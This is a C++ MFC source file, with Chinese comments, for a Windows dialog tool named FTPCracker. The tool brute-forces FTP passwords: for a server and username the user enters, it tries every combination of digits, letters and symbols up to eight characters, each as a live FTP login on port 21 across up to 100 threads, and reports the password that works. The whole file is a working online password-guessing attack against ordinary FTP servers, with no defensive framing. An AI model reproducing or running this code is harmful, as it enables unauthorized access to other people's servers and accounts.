
// FTPCrackerDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "FTPCracker.h"
#include "FTPCrackerDlg.h"
#include "afxdialogex.h"
#include <afxwin.h>
#include <afxinet.h>

#ifdef _DEBUG
#define new DEBUG_NEW
#endif
#define MAX_THREADS 100
const char dic[]="0123456789abcdefghijklmnopqrstuvwxyz!@#$%*";	//破解用的字典
int Thread_Num=0;
int flag=0;
CString result;
CCriticalSection CriticalSection; //线程同步对象
// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

// 对话框数据
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CFTPCrackerDlg 对话框



CFTPCrackerDlg::CFTPCrackerDlg(CWnd* pParent /*=NULL*/)
	: CDialogEx(CFTPCrackerDlg::IDD, pParent)
	, m_UserName(_T(""))
	, m_Result(_T(""))
	, m_Time(_T(""))
	, m_ServerName(_T(""))
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CFTPCrackerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_USRNAME, m_UserName);
	DDV_MaxChars(pDX, m_UserName, 16);
	DDX_Text(pDX, IDC_RESULT, m_Result);
	DDX_Text(pDX, IDC_TIME, m_Time);
	DDX_Text(pDX, IDC_SERVERNAME, m_ServerName);
}

BEGIN_MESSAGE_MAP(CFTPCrackerDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(ID_CRACKE, &CFTPCrackerDlg::OnBnClickedCracke)
	ON_BN_CLICKED(IDC_ALLNUM, &CFTPCrackerDlg::OnBnClickedAllnum)
	ON_BN_CLICKED(IDC_FOUR_NUM_ALPH, &CFTPCrackerDlg::OnBnClickedFourNumAlph)
	ON_BN_CLICKED(IDC_EIGHT_NUM_ALPH, &CFTPCrackerDlg::OnBnClickedEightNumAlph)
END_MESSAGE_MAP()


// CFTPCrackerDlg 消息处理程序

BOOL CFTPCrackerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码
	m_Mode=0;
	((CButton*)GetDlgItem(IDC_ALLNUM))->SetCheck(TRUE);
	GetDlgItem(IDC_SERVERNAME)->SetFocus();
	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CFTPCrackerDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialogEx::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CFTPCrackerDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CFTPCrackerDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}
struct _parm
{
	CString strServer;
	CString strUser;
	CString strPass;
};
UINT Connect(LPVOID par)
{
	CInternetSession * SessionPtr;
	CFtpConnection * ConnectFtpPtr;
	struct _parm *parm=(struct _parm*)par;
	SessionPtr = new CInternetSession(NULL, 1, PRE_CONFIG_INTERNET_ACCESS);
	TRY  
    {  
		ConnectFtpPtr = SessionPtr->GetFtpConnection(parm->strServer, parm->strUser, parm->strPass, 21);  
    }  
    CATCH_ALL(e)  
    {  
		CriticalSection.Lock();
		Thread_Num--;
		CriticalSection.Unlock();
		delete SessionPtr;
        return FALSE;  
    }  
    END_CATCH_ALL
	CriticalSection.Lock();
	result=parm->strPass;
	Thread_Num--;
	flag=1;
	CriticalSection.Unlock();
	delete SessionPtr;
    return TRUE;  
}

void CFTPCrackerDlg::OnBnClickedCracke()
{
	// TODO: 在此添加控件通知处理程序代码
	GetDlgItem(ID_CRACKE)->EnableWindow(FALSE);
	UpdateData(TRUE);
	int start_time,end_time;
	CString pwd,str;
	flag=0;
	start_time=GetTickCount();
	if (0 == m_Mode)		//四位以下纯数字密码
	{
		for (int i = 0; i <= 9; i++)			//1位密码
		{
			pwd.Format("%d",i);
			struct _parm parm;
			parm.strServer=m_ServerName;
			parm.strUser=m_UserName;
			parm.strPass=pwd;
			while (Thread_Num>=MAX_THREADS);//当前线程数大于最大线程数则等待
			CriticalSection.Lock();
			Thread_Num++;
			CriticalSection.Unlock();
			//开始线程
			AfxBeginThread(Connect, (LPVOID)&parm);
			if (flag==1)
			{
				m_Result.SetString(result);
				while (Thread_Num);	//等待线程结束
				goto end;
			}
		}
		for (int i = 0; i <= 9; i++)			//2位密码
			for (int j = 0; j <= 9; j++)
			{
				pwd.Format("%d%d",i,j);
				struct _parm parm;
				parm.strServer=m_ServerName;
				parm.strUser=m_UserName;
				parm.strPass=pwd;
				while (Thread_Num>=MAX_THREADS);//当前线程数大于最大线程数则等待
				CriticalSection.Lock();
				Thread_Num++;
				CriticalSection.Unlock();
				//开始线程
				AfxBeginThread(Connect, (LPVOID)&parm);
				if (flag==1)
				{
					m_Result.SetString(result);
					while (Thread_Num);	//等待线程结束
					goto end;
				}
				Sleep(10);
			}	
		for (int i = 0; i <= 9; i++)			//3位密码
			for (int j = 0; j <= 9; j++)
				for (int k = 0; k <= 9; k++)
				{
					pwd.Format("%d%d%d",i,j,k);
					struct _parm parm;
					parm.strServer=m_ServerName;
					parm.strUser=m_UserName;
					parm.strPass=pwd;
					while (Thread_Num>=MAX_THREADS);//当前线程数大于最大线程数则等待
					CriticalSection.Lock();
					Thread_Num++;
					CriticalSection.Unlock();
					//开始线程
					AfxBeginThread(Connect, (LPVOID)&parm);
					if (flag==1)
					{
						m_Result.SetString(result);
						while (Thread_Num);	//等待线程结束
						goto end;
					}
					Sleep(10);
				}
			for (int i = 0; i <= 9; i++)			//4位密码
				for (int j = 0; j <= 9; j++)
					for (int k = 0; k <= 9; k++)
						for (int l = 0; l <= 9; l++)
						{
							pwd.Format("%d%d%d%d",i,j,k,l);
							struct _parm parm;
							parm.strServer=m_ServerName;
							parm.strUser=m_UserName;
							parm.strPass=pwd;
							while (Thread_Num>=MAX_THREADS);//当前线程数大于最大线程数则等待
							CriticalSection.Lock();
							Thread_Num++;
							CriticalSection.Unlock();
							//开始线程
							AfxBeginThread(Connect, (LPVOID)&parm);
							if (flag==1)
							{
								m_Result.SetString(result);
								while (Thread_Num);	//等待线程结束
								goto end;
							}
							Sleep(10);
						}
		}
		else if (1 == m_Mode)	//四位数字+字母+符号
		{
			for (int i = 0; i < sizeof(dic); i++)	
				for (int j = 0; j < sizeof(dic); j++)
					for (int k = 0; k < sizeof(dic); k++)
						for (int l = 0; l < sizeof(dic); l++)
						{
							pwd.Format("%c%c%c%c",dic[i],dic[j],dic[k],dic[l]);
							struct _parm parm;
							parm.strServer=m_ServerName;
							parm.strUser=m_UserName;
							parm.strPass=pwd;
							while (Thread_Num>=MAX_THREADS);//当前线程数大于最大线程数则等待
							CriticalSection.Lock();
							Thread_Num++;
							CriticalSection.Unlock();
							//开始线程
							AfxBeginThread(Connect, (LPVOID)&parm);
							if (flag==1)
							{
								m_Result.SetString(result);
								while (Thread_Num);	//等待线程结束
								goto end;
							}
							Sleep(5);
						}
		}
		else if (2 == m_Mode)	//八位数字+字母+符号
		{
			for (int i = 0; i < sizeof(dic); i++)	
				for (int j = 0; j < sizeof(dic); j++)
					for (int k = 0; k < sizeof(dic); k++)
						for (int l = 0; l < sizeof(dic); l++)
							for (int m = 0; m < sizeof(dic); m++)	
								for (int n = 0; n < sizeof(dic); n++)
									for (int o = 0; o < sizeof(dic); o++)
										for (int p = 0; p < sizeof(dic); p++)
										{
											pwd.Format("%c%c%c%c%c%c%c%c",dic[i],dic[j],dic[k],dic[l],dic[m],dic[n],dic[o],dic[p]);
											struct _parm parm;
											parm.strServer=m_ServerName;
											parm.strUser=m_UserName;
											parm.strPass=pwd;
											while (Thread_Num>=MAX_THREADS);//当前线程数大于最大线程数则等待
											CriticalSection.Lock();
											Thread_Num++;
											CriticalSection.Unlock();
											//开始线程
											AfxBeginThread(Connect, (LPVOID)&parm);
											if (flag==1)
											{
												m_Result.SetString(result);
												while (Thread_Num);	//等待线程结束
												goto end;
											}
											Sleep(10);
										}
		}
	GetDlgItem(ID_CRACKE)->EnableWindow(TRUE);
	MessageBox("破解失败！","提示",MB_ICONINFORMATION);
	return;
end:
	end_time=GetTickCount();
	m_Time.Format("%f s",(end_time-start_time)/1000.0);
	UpdateData(FALSE);
	MessageBox("破解完成！","提示",MB_ICONINFORMATION);
	while (Thread_Num);
	GetDlgItem(ID_CRACKE)->EnableWindow(TRUE);
}


void CFTPCrackerDlg::OnBnClickedAllnum()
{
	// TODO: 在此添加控件通知处理程序代码
	m_Mode=0;
}


void CFTPCrackerDlg::OnBnClickedFourNumAlph()
{
	// TODO: 在此添加控件通知处理程序代码
	m_Mode=1;
}


void CFTPCrackerDlg::OnBnClickedEightNumAlph()
{
	// TODO: 在此添加控件通知处理程序代码
	m_Mode=2;
}
